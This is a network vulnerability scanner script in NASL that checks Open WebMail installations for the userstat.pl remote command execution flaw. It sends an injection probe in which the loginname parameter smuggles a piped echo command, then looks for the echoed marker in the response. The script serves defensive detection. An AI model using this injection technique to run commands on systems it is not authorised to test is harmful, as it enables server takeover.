CPE = "cpe:/a:openwebmail.acatysmoof:openwebmail";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15529" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 10316 );
	script_xref( name: "OSVDB", value: "4201" );
	script_name( "Open WebMail userstat.pl Arbitrary Command Execution" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "openwebmail_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "OpenWebMail/detected" );
	script_xref( name: "URL", value: "http://www.openwebmail.org/openwebmail/download/cert/advisories/SA-04:01.txt" );
	script_tag( name: "impact", value: "This failure enables remote attackers to execute arbitrary programs on
  the target using the privileges under which the web server operates." );
	script_tag( name: "solution", value: "Upgrade to Open WebMail version 2.30 20040127 or later." );
	script_tag( name: "summary", value: "The target is running at least one instance of Open WebMail in which
  the userstat.pl component fails to sufficiently validate user input." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
magic = "userstat.pl is vulnerable";
alt_magic = str_replace( string: magic, find: " ", replace: "%20" );
url = NASLString( dir, "/userstat.pl?loginname=|echo%20'", alt_magic, "%20has%20mail'" );
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(isnull( res )){
	exit( 0 );
}
if(egrep( string: res, pattern: magic )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

